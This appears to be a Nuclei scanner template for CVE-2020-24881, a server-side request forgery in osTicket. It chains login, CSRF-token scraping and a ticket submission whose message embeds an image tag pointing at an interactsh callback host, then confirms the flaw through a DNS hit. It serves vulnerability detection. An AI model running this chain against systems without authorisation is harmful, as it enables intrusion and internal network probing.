id: CVE-2020-24881

info:
  name: Server Side Request Forgery in OsTicket
  author: hnd3884
  severity: Critical
  description: |
    SSRF vulnerability exists in osTicket before 1.14.3, allowing an attacker to add malicious files to the server or perform port scanning.

variables:
  SESSIONID: '{{rand_base(26, "0123456789abcdefghijklmnopqrstuvwxyz")}}'

http:
  - raw:
      - |
        GET /login.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: OSTSESSID={{SESSIONID}}

    extractors:
      - type: regex
        name: csrf_token
        part: body
        group: 1
        internal: true
        regex:
          - '<meta name="csrf_token" content="(.+?)" \/>'

  - raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: OSTSESSID={{SESSIONID}}

        __CSRFToken__={{csrf_token}}&luser={{username}}&lpasswd={{password}}

  - raw:
      - |
        GET /open.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: OSTSESSID={{SESSIONID}}

    extractors:
      - type: regex
        name: option_value
        part: body
        group: 1
        internal: true
        regex:
          - 'Select a Help Topic.+?[ \n]+<option value="(\d+)" >'
      - type: regex
        name: csrf_token2
        part: body
        group: 1
        internal: true
        regex:
          - '<meta name="csrf_token" content="(.+?)" \/>'

  - raw:
      - |
        GET /ajax.php/form/help-topic/{{option_value}} HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Cookie: OSTSESSID={{SESSIONID}}

    extractors:
      - type: regex
        name: formid
        part: body
        internal: true
        group: 1
        regex:
          - '<label for=\\"([^"]+)\\">'

  - raw:
      - |
        POST /open.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------266856663522356381601517168829
        Cookie: OSTSESSID={{SESSIONID}}

        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="__CSRFToken__"

        {{csrf_token2}}
        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="a"

        open
        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="topicId"

        {{option_value}}
        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="{{formid}}"

        1
        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="message"

        <img src="https://11111.{{interactsh-url}}">
        -----------------------------266856663522356381601517168829
        Content-Disposition: form-data; name="draft_id"


        -----------------------------266856663522356381601517168829--
    extractors:
      - type: regex
        name: ticketid
        part: header
        internal: true
        group: 1
        regex:
          - 'Location: tickets\.php\?id=(\d+)'
    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "dns")'
          - "status_code == 302"
        condition: and

  - raw:
      - |
        GET /tickets.php?a=print&id={{ticketid}} HTTP/1.1
        Host: {{Hostname}}
        Cookie: OSTSESSID={{SESSIONID}}
